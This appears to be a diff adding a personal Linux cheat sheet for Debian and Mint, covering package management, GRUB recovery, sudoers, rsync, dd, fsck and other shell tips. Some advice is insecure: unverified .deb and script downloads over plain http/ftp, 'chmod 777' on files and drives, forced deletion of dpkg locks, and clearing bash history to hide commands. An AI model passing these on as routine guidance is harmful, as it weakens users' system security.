@@ -1,0 +1,2073 @@
+ _____ _            _   _            _             _        ____      _                 _          
+|_   _| |__   ___  | | | | __ _  ___| | _____ _ __( )___   / ___|_ __(_)_ __ ___   ___ (_)_ __ ___ 
+  | | | '_ \ / _ \ | |_| |/ _` |/ __| |/ / _ \ '__|// __| | |  _| '__| | '_ ` _ \ / _ \| | '__/ _ \
+  | | | | | |  __/ |  _  | (_| | (__|   <  __/ |    \__ \ | |_| | |  | | | | | | | (_) | | | |  __/
+  |_| |_| |_|\___| |_| |_|\__,_|\___|_|\_\___|_|    |___/  \____|_|  |_|_| |_| |_|\___/|_|_|  \___|
+                                                                                                   
+    _               _    ____ _____   ____  _                       
+   / \   _ __      / \  |  _ \_   _| / ___|| |_ __ _ _ __  ______ _ 
+  / _ \ | '_ \    / _ \ | |_) || |   \___ \| __/ _` | '_ \|_  / _` |
+ / ___ \| | | |  / ___ \|  __/ | |    ___) | || (_| | | | |/ / (_| |
+/_/   \_\_| |_| /_/   \_\_|    |_|   |____/ \__\__,_|_| |_/___\__,_|
+
+Carry me always, carry me well.
+I am thy teacher of Linux and shell.
+I am thy link to programs arcane.
+Forget me and thy kernel will wane.
+
+Ten times ten commandments there be.
+They will answer every mystery.
+Kernels, cheats, and apt-key.
+These secrets shall be thine, through me.
+
+But, hacker, remember this above all.
+I am not for those in mud that crawl.
+And forever doomed shall be the one.
+Who betrays my secrets one by one.
+- Revised with a Linux spin from Eoin Colfer's "Artemis Fowl"
+
+
+Scribble scribble scribble, as every mage must do.
+These walls will hold your power fast, unless I walk right through.
+A boat I bade from birch and bark, but burned I did at morn.
+Rather I gather in this held spot, than suffer my hands get worn.
+- Shandalar from Baldur's Gate: Tales of the Sword Coast
+ ____       _     _             
+|  _ \  ___| |__ (_) __ _ _ __  
+| | | |/ _ \ '_ \| |/ _` | '_ \ 
+| |_| |  __/ |_) | | (_| | | | |
+|____/ \___|_.__/|_|\__,_|_| |_|
+-------------------------------------------------------------------
+Finding the Fastest Sources for Debian Repos
+A command line tool called “netselect-apt” is available to find the fastest debian mirror.
+The output file is written to OUTFILE.
+	sudo aptitude install netselect-apt
+The command will look something like this when used
+	netselect-apt -c australia -t 15 -a amd64 -n testing
+
+	man netselect-apt for command line options
+
+-------------------------------------------------------------------
+Compiling SID packages into Wheezy
+Install the Debian source (and the development tools, especially debhelper, devscripts, and build-essential), and then build the package.
+Step by step:
+	add a deb-src line for sid to your sources.list
+
+	apt-get update
+	apt-get build-dep PACKAGE_NAME
+	apt-get -b source PACKAGE_NAME
+The resulting debs should be in the current directory and can be installed with dpkg -i the.deb.
+
+-------------------------------------------------------------------
+Checking updates for stability
+	sudo apt-get install apt-listbugs
+
+-------------------------------------------------------------------
+Changing hostname
+In order to change the hostname of the computer, you need to change the old hostname present in all the areas below to the new hostname.
+	/etc/exim4/update-exim4.conf.conf \
+	/etc/printcap \
+	/etc/hostname \
+	/etc/hosts \
+	/etc/ssh/ssh_host_rsa_key.pub \
+	/etc/ssh/ssh_host_dsa_key.pub \
+	/etc/motd \
+	/etc/ssmtp/ssmtp.conf
+Then reboot the computer. The new hostname should be used immediately.
+
+-------------------------------------------------------------------
+Debian KDE Plasma 5 missing window decorations
+	If windows are missing titlebar, and all window decoration in Plasma 5, install kwin (or the newest version of kwin available in Sid)
+
+  ____ ____  _   _ ____  
+ / ___|  _ \| | | | __ ) 
+| |  _| |_) | | | |  _ \ 
+| |_| |  _ <| |_| | |_) |
+ \____|_| \_\\___/|____/ 
+-------------------------------------------------------------------
+Installing grub-customizer on Debian
+	wget https://launchpad.net/grub-customizer/5.0/5.0.6/+download/grub-customizer_5.0.6.tar.gz
+	tar zxvf grub-customizer_5.0.6.tar.gz
+	ls grub-customizer-5.0.6/
+	cmake .&& make -j8
+	sudo make install
+
+If you made a mistake or don't want Grub Customizer installed just type inside grub-customizer-5.0.6 directory:
+	make uninstall
+	cd ..;rm -rf grub-customizer-5.0.6
+
+ ____            _                         
+|  _ \ __ _  ___| | ____ _  __ _  ___  ___ 
+| |_) / _` |/ __| |/ / _` |/ _` |/ _ \/ __|
+|  __/ (_| | (__|   < (_| | (_| |  __/\__ \
+|_|   \__,_|\___|_|\_\__,_|\__, |\___||___/
+                           |___/           
+-------------------------------------------------------------------
+Finding All the Packages
+If you haven't cleaned this folder recently, you can find every package you've installed in /var/cache/apt/archives
+This is useful to roll back to a previous version if something breaks.
+
+ _            _ 
+(_)_ __ __  _(_)
+| | '_ \\ \/ / |
+| | | | |>  <| |
+|_|_| |_/_/\_\_|
+-------------------------------------------------------------------
+Installing inxi on Debian
+A few Debian based distributions package inxi, or include the inxi installer in their base systems, like Linux Mint.
+As of Debian Jesse, Debian Sid/Testing - inxi is in apt, so just do:
+	apt-get install inxi
+If you're on Debian Wheezy, add the deb-src for Jessie and Sid, and compile a backport of the package
+
+If in doubt, just search for it in apt, it's there, install it.
+	apt-cache search inxi
+
+For older systems, use the generally out of date cathbards repo:
+	wget ftp://cathbard.com/binary/inxi*.deb
+	sudo dpkg -i inxi...
+	sudo apt-get install -f
+Or if you have cathbards repos ( add cathbard repos ) in your apt sources.list:
+	apt-get update && apt-get install inxi
+Then update inxi
+        sudo inxi -U
+
+-------------------------------------------------------------------
+Allowing inxi to self-update on Mint
+The inxi program has been neutered on most Linux distros so it can't update using -U
+To allow updating, open a Terminal and
+	sudo touch /etc/inxi.conf && echo 'B_ALLOW_UPDATE=true' >> /etc/inxi.conf
+ ____                                     _     
+|  _ \ __ _ ___ _____      _____  _ __ __| |___ 
+| |_) / _` / __/ __\ \ /\ / / _ \| '__/ _` / __|
+|  __/ (_| \__ \__ \\ V  V / (_) | | | (_| \__ \
+|_|   \__,_|___/___/ \_/\_/ \___/|_|  \__,_|___/
+-------------------------------------------------------------------
+Generating Passwords
+
+	sudo aptitude install makepasswd
+
+makepasswd - generate and/or encrypt passwords
+	makepasswd  [ --chars N ] [ --clearfrom file ] [ --count N ] [ --crypt | --nocrypt | --crypt-md5 ] [ --cryptsalt N ] [ --help ] [ --maxchars N ] [ --minchars N ] [ --randomseed N ] [ --rerandom N ] [ --repeatpass N] [ --string string ] [ --verbose | --noverbose ]
+		--chars # (Generate passwords with exactly # characters)
+		--clearfrom FILE (Use password from FILE instead of generating passwords. Requires --crypt or --crypt-md5)
+		--count # (Generate a total of # passwords - default is 1)
+		--crypt (Produce encrypted passwords)
+		--crypt-md5 (Produce encrypted passwords using MD5)
+	I like using makepasswd this way
+		touch FILE
+		(Enter a password into the file)
+		makepasswd --clearfrom FILE --repeatpass 30 --crypt >> passwordfile
+		makepasswd --clearfrom FILE --repeatpass 30 --crypt-md5 >> passwordfile
+               _       
+ ___ _   _  __| | ___  
+/ __| | | |/ _` |/ _ \ 
+\__ \ |_| | (_| | (_) |
+|___/\__,_|\__,_|\___/ 
+-------------------------------------------------------------------
+sudo allows a permitted user to execute a command as the superuser or another user, as specified in the sudoers file.
+The real and effective uid and gid are set to match those of the target user as specified in the passwd file (the group vector is also initialized when the target user is not root).
+By default, sudo requires that users authenticate themselves with a password (NOTE: by default this is the user's password, not the root password).
+Once a user has been authenticated, a timestamp is updated and the user may then use sudo without a password for a short period of time (5 minutes unless overridden in sudoers).
+
+-------------------------------------------------------------------
+Adding user to access Sudo
+Users are not given sudo on initial install. To fix this, open Terminal, then load the sudoers file.
+	su
+	visudo
+
+You'll see a line in the file that looks like this:
+	# User privilege specification
+	root    ALL=(ALL:ALL) ALL
+
+Copy the line beginning with root, and paste it below. Then edit that line so that "root" is the username of the user that needs root/sudo access.
+It should look like this after you are done:
+	# User privilege specification
+	root        ALL=(ALL:ALL) ALL
+	newuser    ALL=(ALL:ALL) ALL
+
+ _   _      _                      _    
+| \ | | ___| |___      _____  _ __| | __
+|  \| |/ _ \ __\ \ /\ / / _ \| '__| |/ /
+| |\  |  __/ |_ \ V  V / (_) | |  |   < 
+|_| \_|\___|\__| \_/\_/ \___/|_|  |_|\_\
+-------------------------------------------------------------------
+Turning on Ethernet from a failsafe terminal.
+
+Place the following into /etc/network/interfaces with an editor.
+	sudo nano /etc/network/interfaces
+This block of text will cause the network manager to bring up your Ethernet automatically and configure it with DHCP.
+	auto eth0 iface
+	iface eth0 inet dhcp
+After adding this restart the network manager with:
+
+sudo /etc/init.d/networking restart
+
+If this causes an error message, restart the computer.
+-------------------------------------------------------------------
+Finding the Fastest DNS servers
+Install namebench, and run the namebench utility.
+	sudo apt-get install namebench
+	namebench
+
+-------------------------------------------------------------------
+To Find the MAC Address of a Disconnected Computer
+Connection information doesn’t usually display your MAC address until the computer is connected to the internet. To find the MAC address, use the following Terminal command:
+	ip addr show
+
+-------------------------------------------------------------------
+How to Do Ping Testing with MTR
+I like to customize the MTR command to figure out specific things:
+When the command specifies a ping count (using -c) assume that the sensitivity of the report can be raised or lowered by increasing or decreasing the count.
+
+The following command is good for quick toast reports
+	mtr -c 20 -w -r -location
+The following command is good for testing UDP connections (for Skype)
+	mtr -c 20 -w -r -u -location
+You can also check IPv4 and IPv6 connectivity using this command
+	(IPv4) mtr -c 20 -4 -w -r -location
+	(IPv6) mtr -c 20 -6 -w -r -location
+
+ _     _                    __  __ _       _   
+| |   (_)_ __  _   ___  __ |  \/  (_)_ __ | |_ 
+| |   | | '_ \| | | \ \/ / | |\/| | | '_ \| __|
+| |___| | | | | |_| |>  <  | |  | | | | | | |_ 
+|_____|_|_| |_|\__,_/_/\_\ |_|  |_|_|_| |_|\__|
+-------------------------------------------------------------------
+Installing Debian Sources into Mint
+THIS IS NOT RECOMMENDED!! It is possible, but used unwisely this could easily break your system.
+Add all the sources you want to /etc/apt/sources.list.d/ in a seperate file that ends with the .list extension
+Update the repos. It will probably give you an error that PUBKEY could not be verified.
+To verify Debian sources:
+	sudo apt-get install debian-archive-keyring debian-keyring
+
+	debian-archive-keyring       - GnuPG archive keys of the Debian archive
+	debian-edu-archive-keyring   - GnuPG archive keys of the Debian Edu archive
+	debian-keyring               - GnuPG keys of Debian Developers
+	debian-ports-archive-keyring - GnuPG archive keys of the debian-ports archive
+	emdebian-archive-keyring     - GnuPG archive keys for the emdebian repository
+
+-------------------------------------------------------------------
+Getting mintstick on Ubuntu/Debian based distros (that aren't Mint)
+Mintstick is a handy tool to use for formatting and creating USB sticks. It's so much easier to use this tool than use fdisk or mkfs
+It also includes an imagewriter that makes creating Live Linux USB drives a snap!
+However, this package is only included on Linux Mint distros. If you're not using Mint, you'll need to follow the steps below.
+	wget http://packages.linuxmint.com/pool/main/m/mintstick/mintstick_1.2.8_all.deb
+	sudo dpkg -i mintstick_1.2.8_all.deb
+It probably won't install because of missing packages, so...
+	sudo apt-get install -f
+
+ ___                                 
+|_ _|_ __ ___   __ _  __ _  ___  ___ 
+ | || '_ ` _ \ / _` |/ _` |/ _ \/ __|
+ | || | | | | | (_| | (_| |  __/\__ \
+|___|_| |_| |_|\__,_|\__, |\___||___/
+                     |___/           
+-------------------------------------------------------------------
+Convert pdf to jpg
+Easiest way to do that is to use pdftohtml which is part of the poppler-utils package.
+	pdftohtml [pdf file]
+
+-------------------------------------------------------------------
+Using Imagemagick
+The convert command takes an image, performs actions on it, and saves the image with the file name you specify. One of the most basic things you can do with it is converting images between formats.
+
+The following command takes a PNG file named “howtogeek.png” in the current directory and creates a JPEG image from it:
+	convert howtogeek.png howtogeek.jpg
+
+You can also specify a compression level for JPEG images:
+	convert howtogeek.png -quality 95 howtogeek.jpg
+
+The convert command can also quickly resize an image.
+The following command asks ImageMagick to resize an image to 200 pixels in width and 100 pixels in height:
+	convert example.png -resize 200×100 example.png
+
+It will alter the image to fit within a 200×100 area, but the image may not be exactly 200×100.
+If you want to force the image to become a specific size – even if it messes up the aspect ratio – add an exclamation point to the dimensions:
+	convert example.png -resize 200×100! example.png
+
+All these operations can be combined. With a single command, you could resize an image, rotate it, apply an effect, and convert it to another format:
+	convert howtogeek.png -resize 400×400 -rotate 180 -charcoal 4 -quality 95 howtogeek.jpg
+
+You can take advantage of Bash to quickly do batch processing of many images.
+For example, the following command would take all PNG files in the current directory, rotate them, and save a new copy of each with “-rotated” added to the beginning of each file name.
+	for file in *.png; do convert $file -rotate 90 rotated-$file; done
+
+Many more operations are possible by reading "man convert"
+ ____  _                _                               _____ _           _     
+/ ___|| |__   ___   ___| | ____      ____ ___   _____  |  ___| | __ _ ___| |__  
+\___ \| '_ \ / _ \ / __| |/ /\ \ /\ / / _` \ \ / / _ \ | |_  | |/ _` / __| '_ \ 
+ ___) | | | | (_) | (__|   <  \ V  V / (_| |\ V /  __/ |  _| | | (_| \__ \ | | |
+|____/|_| |_|\___/ \___|_|\_\  \_/\_/ \__,_| \_/ \___| |_|   |_|\__,_|___/_| |_|
+-------------------------------------------------------------------
+Run Interactive .swf Files Natively on Linux Mint
+Open Terminal
+	cd /usr/share/mime/packages
+	sudo nano freedesktop.org.xml
+In that file search for "vnd.adobe.flash.movie"
+This should find a line that looks like:
+	<mime-type type="application/vnd.adobe.flash.movie">
+Edit that line to read:
+	<mime-type type="application/x-shockwave-flash">
+Save the file.
+Then run:
+	sudo update-mime-database /usr/share/mime
+
+-------------------------------------------------------------------
+Another way to Interact with Flash Files?
+Electic_Peppermint gave me this, and found at http://askubuntu.com/questions/478169/why-cant-firefox-run-local-swf-files
+Another option is to create ~/.mime.types in the home directory with following content:
+	"application/x-shockwave-flash       swf swfl"
+This way it will not get overwritten on system upgrade.
+
+[10/23/15 10:02] <Electric_Peppermint> create an "untitled document" in your home directory and name it ".mime.types". The file name will not show up in your file browser.
+[10/23/15 10:02] <Electric_Peppermint> Open the file with gedit and paste this line into it, "application/x-shockwave-flash       swf swfl". Now go to File and click Save. You're done.
+[10/23/15 10:02] <Electric_Peppermint> When you refresh the page in your file browser the document will be automatically hidden.
+
+ ____                                          
+|  _ \ _ __ ___   __ _ _ __ __ _ _ __ ___  ___ 
+| |_) | '__/ _ \ / _` | '__/ _` | '_ ` _ \/ __|
+|  __/| | | (_) | (_| | | | (_| | | | | | \__ \
+|_|   |_|  \___/ \__, |_|  \__,_|_| |_| |_|___/
+                 |___/                         
+-------------------------------------------------------------------
+Ripping .wav to .mp3
+	lame -h -b 256 <input wav file> <output mp3 file>
+
+-------------------------------------------------------------------
+Installing ScreenFetch
+
+Screenfetch is a really cool way of displaying infos about your computer in a Terminal.
+	wget -O screenfetch 'https://raw.github.com/KittyKatt/screenfetch/master/screenfetch-dev'
+	chmod +x screenfetch
+	sudo mv screenfetch /usr/bin/
+
+-------------------------------------------------------------------
+Installing Mouse Cursors
+Drop cursor files in /usr/share/icons
+Select a cursor theme. Restart computer to apply.
+
+-------------------------------------------------------------------
+Installing libdvdcss2
+	sudo apt-get install libdvdread4
+	sudo /usr/share/doc/libdvdread4/install-css.sh
+
+__        ___            
+\ \      / (_)_ __   ___ 
+ \ \ /\ / /| | '_ \ / _ \
+  \ V  V / | | | | |  __/
+   \_/\_/  |_|_| |_|\___|
+-------------------------------------------------------------------
+Installing Wine
+	sudo add-apt-repository ppa:ubuntu-wine/ppa
+
+-------------------------------------------------------------------
+Removing WINE programs from the menu
+Sometimes after you uninstall a program from WINE, the menu entry remains behind. Here’s how to remove the menu entry as well:
+	$HOME/.config/menus/applications-merged/wine
+	$HOME/.local/share/applications/wine
+	$HOME/.local/share/desktop-directories/wine
+	$HOME/.local/share/icons
+
+ _____ _ _        __  __                                                   _   
+|  ___(_) | ___  |  \/  | __ _ _ __   __ _  __ _  ___ _ __ ___   ___ _ __ | |_ 
+| |_  | | |/ _ \ | |\/| |/ _` | '_ \ / _` |/ _` |/ _ \ '_ ` _ \ / _ \ '_ \| __|
+|  _| | | |  __/ | |  | | (_| | | | | (_| | (_| |  __/ | | | | |  __/ | | | |_ 
+|_|   |_|_|\___| |_|  |_|\__,_|_| |_|\__,_|\__, |\___|_| |_| |_|\___|_| |_|\__|
+                                           |___/                               
+-------------------------------------------------------------------
+All About Chmod
+You can see file permissions by typing
+	ls -l
+
+You can also you binary coding to set permissions. The code is split the following way:
+
+-------------------------------------------------------------------------------------------------
+|	Owner			|	Group			|	Others			|
+|(R)ead, (W)rite, (E)xecute	|(R)ead, (W)rite, (E)xecute	|(R)ead, (W)rite, (E)xecute	|
+-------------------------------------------------------------------------------------------------
+
+000 = 0 (Completely locked)
+001 = 1 (Execute only)
+010 = 2 (Write only)
+011 = 3 (Write and execute)
+100 = 4 (Read only)
+101 = 5 (Read and execute)
+110 = 6 (Read and write)
+111 = 7 (Full access)
+
+So to give a file full access permissions for anyone use:
+	chmod 777 [file]
+
+-------------------------------------------------------------------
+Ripping DVD to ISO
+	Use dd command
+	dd if=/dev/cdrom of=file.iso
+
+-------------------------------------------------------------------
+Getting a load bar with the dd command
+
+dd can convert and copy files from source to destination.
+	if=PATH - Read from PATH
+	of=PATH - Write to PATH
+
+The standard way to use dd is:
+	dd if=/path/to/source of=/path/to/write
+
+Sending a USR1 signal to a running 'dd' process makes it print I/O statistics to standard error and then resume copying.
+
+	$ dd if=/dev/zero of=/dev/null& pid=$!
+	$ kill -USR1 $pid; sleep 1; kill $pid
+		18335302+0 records in 18335302+0 records out 9387674624 bytes (9.4 GB) copied, 34.6279 seconds, 271 MB/s
+
+
+Another method is to use pv to add a loading bar.
+To get a loading bar on dd:
+	sudo aptitude install pv
+Then use the following piped command:
+	dd if=/path/to/source | pv | dd of=/path/to/write
+
+
+ ____  ______   ___   _  ____ 
+|  _ \/ ___\ \ / / \ | |/ ___|
+| |_) \___ \\ V /|  \| | |    
+|  _ < ___) || | | |\  | |___ 
+|_| \_\____/ |_| |_| \_|\____|
+-------------------------------------------------------------------
+Using RSYNC
+
+rsync stands for remote sync.First time, rsync replicates the whole content between the source and destination directories. Next time, rsync transfers only the changed blocks or bytes to the destination location, which makes the transfer really fast.
+	rsync [options] source destination
+Here’s how I use rsync when backing up my hard drive to an external backup.
+	rsync -izvrdop --progress source destination
+
+Here's a way to mirror a folder onto an external SD card, so that the files are transferred in the correct order.
+	rsync -avP
+For transferring songs from folder to KH SD card, make a folder on the computer with the songs correctly labeled and in order. The copy the files from the folder to two folders on the SD labeled A and Z.
+	rsync -ravP source/ /media/user/Music/A/
+	rsync -ravP source/ /media/user/Music/Z/
+
+If a file is not present at the source, but present at the target, you might want to delete the file at the target during rsync.
+In that case, use –delete option as shown below. rsync delete option deletes files that are not there in source directory.
+	rsync -zvrdop --delete source destination
+
+If you like, you can update (Sync) only the existing files at the target. In case source has new files, which is not there at the target, you can avoid creating these new files at the target. If you want this feature, use –existing option with rsync command.
+	rsync -zvrdop --existing source destination
+
+Use -i to view the difference between the source and destination files before transfer. In the output, it will display up to 11 letters in front of the filename or directory name to indicate the changes. Check “man rsync” for the meanings of these letters.
+	rsync -izvrdop source destination
+
+Use the --dry-run option for testing. This won’t transfer files but will simulate the transfer
+	rsync -zvrdop --dry-run source destination
+
+ ____    _    ____  _   _ 
+| __ )  / \  / ___|| | | |
+|  _ \ / _ \ \___ \| |_| |
+| |_) / ___ \ ___) |  _  |
+|____/_/   \_\____/|_| |_|
+-------------------------------------------------------------------
+Changing font in TTY - WARNING: MAY KILL KITTENS
+	To change the TTY font sudo dpkg-reconfigure console-setup
+	If you did this in TTY, the changes will happen immediately after you finish.
+	If you did not, open TTY and type "setupcon"
+
+-------------------------------------------------------------------
+Filtering results
+You can use wildcards to filter results in "ls"
+For example, while in the Documents folder, you can see only PDF's by using:
+
+	ls *pdf
+
+-------------------------------------------------------------------
+Brace Expansion
+Using brackets {} in a BASH statement allows you to make commands that run with different strings.
+For example, in the following command, md5sum is run on all images that end with jpg, JPG, png, and PNG.
+
+md5sum *.{jpg,JPG,png,PNG}
+
+-------------------------------------------------------------------
+Printing Line Numbers on ls output
+	ls | cat -n
+
+-------------------------------------------------------------------
+Clearing BASH History
+After a long time of using BASH, you get a history file that is HUGE! Mine can usually top out to 2000 commands within a week or two.
+But if there are some commands you don't want people to see, there are multiple ways to go about deleting them.
+
+To erase the history file completely and start over:
+	history -c && history -w
+To edit commands out of the history file
+	nano ~/.bash_history
+Then, save the file, and CLOSE the Terminal completely and reopen it.
+
+
+-------------------------------------------------------------------
+Force Login Shell in Terminal
+If a login shell is not an option on the Terminal settings (common in Konsole)
+
+Edit the Current Profile
+look for the login Command. It will likely look like
+	/bin/bash
+Edit that line to read
+	/bin/bash -l
+
+This will force a login shell everytime the Terminal profile is opened.
+
+-------------------------------------------------------------------
+The GREP Manual
+To search for the given string within a single file
+        grep “literal_string” [filename]
+To search for a given string within multiple files
+        grep “literal_string” FILE_PATTERN
+Case-insensitive search
+        grep -i “literal_string” [filename]
+        grep -i “string” FILE_PATTERN
+Regular expression search - This is very powerful feature, if you use regular expression correctly. In the following example, grep searches for all the pattern that starts with “lines” and ends with “empty” and has anything in between in the demo_file.
+        grep “lines.*empty” demo_file
+
+From the documentation of grep:
+A regular expression may be followed by one of several repetition operators:
+?       The preceding item is optional and matched at most once.
+*       The preceding item will be matched zero or more times.
++       The preceding item will be matched one or more times.
+{n}     The preceding item is matched exactly n times.
+{n,}    The preceding item is matched n or more times.
+{n,m}   The preceding item is matched at least n times, but not more than m times.
+
+To search all files under the current directory and its subdirectory, use
+        grep -r
+When you want to display lines that do not match the search, invert the search with
+        grep -v
+Display the lines which do not match all the given patterns
+        grep -v -e “pattern” -e “pattern”
+Show line numbers and file names in results
+        grep -n -H
+
+-------------------------------------------------------------------
+Finding out the Command behind an Alias
+To figure out easily what the command is that is running behind an alias, use:
+	type [alias]
+	
+  ____ ____  _   _      __  __  __                                 
+ / ___|  _ \| | | |    / / |  \/  | ___ _ __ ___   ___  _ __ _   _ 
+| |   | |_) | | | |   / /  | |\/| |/ _ \ '_ ` _ \ / _ \| '__| | | |
+| |___|  __/| |_| |  / /   | |  | |  __/ | | | | | (_) | |  | |_| |
+ \____|_|    \___/  /_/    |_|  |_|\___|_| |_| |_|\___/|_|   \__, |
+                                                             |___/ 
+-------------------------------------------------------------------
+See Available Memory
+To see more information on memory, open Terminal and type in the following command:
+	cat /proc/meminfo
+
+-------------------------------------------------------------------
+How I Use “Ps”
+ps displays information about a selection of the active processes.
+If you want a repetitive update of the selection and the displayed information, use "htop" or “top” instead. Or you can use the directions above to see memory infos.
+
+To see which programs are leaking
+	ps -eo rss,vsz,pid,cmd,cputime | sort -n | tail -20
+To list processes by % CPU usage
+	ps -eo pcpu,cpu,nice,state,cputime,args --sort pcpu | sed ‘/^0.0 /d’
+To list processes by %mem
+	ps -eo args,%cpu,%mem --sort +%mem
+To figure out when processes were started
+	ps -eo lstart
+To list processes in a hierarchy, tree format
+	ps -eo pid,args --forest
+To list all threads in a particular process
+	ps -C [process] -L -o pid,tid,pcpu,state
+
+ ____       _             __  __                                                   _   
+|  _ \ _ __(_)_   _____  |  \/  | __ _ _ __   __ _  __ _  ___ _ __ ___   ___ _ __ | |_ 
+| | | | '__| \ \ / / _ \ | |\/| |/ _` | '_ \ / _` |/ _` |/ _ \ '_ ` _ \ / _ \ '_ \| __|
+| |_| | |  | |\ V /  __/ | |  | | (_| | | | | (_| | (_| |  __/ | | | | |  __/ | | | |_ 
+|____/|_|  |_| \_/ \___| |_|  |_|\__,_|_| |_|\__,_|\__, |\___|_| |_| |_|\___|_| |_|\__|
+                                                   |___/                               
+-------------------------------------------------------------------
+All About FSCK (Go FSCK Yourself)
+If you want to reboot and have the computer perform an FSCK on the next reboot, then open the Terminal and type:
+	sudo shutdown -rF now
+OR…
+	cd; sudo touch /forcefsck
+
+Of course, there are some situations where we have to use the command line tool to check our file system. For example, when using a headless system, when a Linux box fails to boot, or when I really want to show off my Linux kung-fu skills to friends.
+
+One thing to note before using FSCK: You need to unmount the file system being scanned using the ‘umount’ command. Fixing a mounted file system with FSCK could end up creating more damage than the original problem.
+
+First: Locate the drive you are going to FSCK
+	sudo fdisk -l
+Second: Unmount the drive (Replace /dev/sdb with the correct address from step 1)
+	sudo umount /dev/sdb
+Now start the FSCK (Replace /dev/sdb with the correct address from step 1 and 2)
+	sudo fsck -t ext4 /dev/sdb
+	
+-------------------------------------------------------------------
+Scan a drive for bad sectors
+To scan a computer for bad sectors, you can either use the Drive Utility tool or the badblocks Terminal command.
+First: Locate the drive you are going to FSCK
+	sudo fdisk -l
+Now use the badblocks command (Replace /dev/sdb with the correct address from step 1)
+	sudo badblocks -v /dev/sdb1
+After it has run, badblocks will display a report of the bad sectors of the hard drive. You have two options when you see bad blocks. You can either look for a new hard drive, or mark these sectors as unusable hard drive sectors.
+This involves two steps:
+First you have to write the location of the bad sectors to a flat file
+	sudo badblocks /dev/sda > ~/bad-blocks
+After that, we need to feed the flat file into the FSCK command to mark these sectors as unusable
+	sudo fsck -l bad-blocks /dev/sda
+
+-------------------------------------------------------------------
+Tweaking Things in GRUB - WARNING: CAN KILL KITTENS
+Your GRUB settings are stored in. This is the file you edit to change GRUB settings.
+	/etc/default/grub
+
+Scripts are located in: Be careful editing or changing any scripts here. Serious system damage can result.
+	/etc/grub.d/
+
+After editing things, run the command
+	update-grub
+This makes GRUB automatically combines the settings from the /etc/default/grub, the scripts from the /etc/grub.d/, and creates a /boot/grub/grub.cfg file that’s read at boot.
+If necessary, it is possible to edit this final file, but be very careful.
+
+-------------------------------------------------------------------
+Recovering GRUB
+Boot into your Linux LiveCD (best to use the same version as the one you are recovering).
+Open Terminal and type:
+	sudo fdisk -l
+Under this list you can see which one is the Linux Mint partition. It’s usually /dev/sda1/ unless you are dual-booting.
+You need to mount the Linux Mint partition so you can access it. To do this, type:
+	sudo mount /dev/sdXY /mnt
+	(Replace X with the correct letter, and Y with the correct number)
+Now you need to tell Linux Mint to install grub2 to the partition you just mounted. To do this, type:
+	sudo grub-install --root-directory=/mnt/ /dev/sdX
+	(replace X with correct letter)
+(It is IMPORTANT that you do NOT enter any number, just the letter of the partition)
+Now reboot the computer. You should see a GRUB menu pop up when the reboot is done. If you are dual-booting you may need to refresh GRUB so it detects any Windows partitions. To do this, log in, and open a Terminal and type:
+	sudo update-grub
+		
+-------------------------------------------------------------------
+How to Fix Broken Package Headers that Prevent Updating
+Occasionally I’ve noticed that the Package Manager in Mint will encounter an odd error. It will display a broken symbol and apt-get update will generate a message like this:
+	Reading package lists... Error!
+	E: Encountered a package list with no Package: header
+	E: Problem with MergeList /var/lib/apt/lists/mirror.umd.edu_linuxmint_packages_dists_nadia_import_i18n_Translation-en
+Going in the help room was no help, because they told me I must have screwed up my install somehow. However this has occasionally happened to me on a fresh install. So I hunted for the solution. Finally figured it out.
+Open two Terminals side-by-side.
+In one Terminal, duplicate the error by typing
+	sudo apt-get update
+It will download all the lists and error out.
+In the other Terminal go to the folder location mentioned in the error:
+	cd /var/lib/apt/lists/
+In that folder there are lots of MergeLists, one or more of which is borked (could be more than one, but you’ll only get one error at a time). You will lose nothing by deleting these MergeLists, because they will be completely restored and functional on a new apt-get update. So, I start by axing all the files that broadly match the error file:
+	sudo rm mirror.umd.edu*
+After that’s done, switch to the other Terminal and type
+	sudo apt-get update
+Let it update. If you encounter another error, switch to the other Terminal and axe some more MergeLists. Otherwise the error should go away once the MergeLists have been refreshed.
+
+-------------------------------------------------------------------
+How to Unlock DPKG
+If you start installing a package, and for whatever reason have to abort the install it will most likely lock up dpkg and you’ll be unable to install anything else until the installation you just started is finished. This can be rough if the package in question won’t install for some reason.
+Sometimes dpkg can get locked because the xapian-index is out of date. Update it and see if this clears the lock.
+	sudo update-apt-xapian-index  --force
+If that doesn’t work, figure out which program has executed a lock on dpkg:
+	sudo fuser -vvv /var/lib/dpkg/lock
+	sudo fuser -vvv /var/lib/apt/lists/lock
+	sudo fuser -vvv /var/cache/apt/archives/lock
+You can also use fuser to figure out other locks by substituting the lock location in the above command.
+	sudo fuser -vvv /location/location/location
+You can kill those programs individually by executing a kill on their PID
+	kill [pid number of dpkg lock]
+If all else fails, just delete the lock files:
+	sudo rm -fv /var/lib/apt/lists/lock
+	sudo rm -fv /var/lib/dpkg/lock
+	sudo rm -fv /var/cache/apt/archives/lock
+Then to stop dpkg from trying to install the same package again.
+	sudo dpkg -r [name of package you don’t want installing again]
+	sudo dpkg --configure -a
+It will remove the package from the cache and install any other packages held because of the broken package was lagging the install.
+
+-------------------------------------------------------------------
+Formatting External Drive to EXT4
+
+Check the drive partition status in FDisk
+	sudo fdisk -l
+If needed, delete old partitions and set up a new partition in FDisk
+	sudo fdisk /dev/sdb
+This brings up the FDisk menu, which can be complicated at times.
+Command action
+	a   toggle a bootable flagL
+	b   edit bsd disklabel
+	c   toggle the dos compatibility flag
+	d   delete a partition
+	You will be asked for a partition number. If you want to delete /dev/sdb5 you would enter 5
+
+	l   list known partition types
+	m   print this menu
+	n   add a new partition
+	o   create a new empty DOS partition table
+	p   print the partition table
+	q   quit without saving changes
+	s   create a new empty Sun disklabel
+	t   change a partition's system id
+	u   change display/entry units
+	v   verify the partition table
+	w   write table to disk and exit
+	x   extra functionality (experts only)
+
+Here's how I use FDisk.
+Listing partitions on disk, press "p". To create new ones press "n" (probably after deleting one or more partitions by pressing "d"). Finally, press "w" to write the changes to the disk
+
+After that is done, you actually need to format the new partition to EXT4.
+	sudo mkfs.ext4 /dev/sdbX
+
+You will probably notice that the drive won't allow you to add/remove any files even after the format.
+Find the mountpoint of the drive using
+	lsblk
+You'll see the mountpoint listed next to the drive entry like below:
+sdb1      8:16   1   7.4G  0 disk /media/user/location
+
+So navigate to the actual drive location
+	cd /media/user
+	ls -al
+That will probably show that the drive is owned by root:root and cannot be written to. Use the following commands to take control of the drive.
+	chown username:username /media/location
+	chmod 777 /media/location
+This will change the device to read/write/execute, and it will be owned by the correct user. You can now write to the drive.
+__        ___           _                     ____       _             __  __                                                   _   
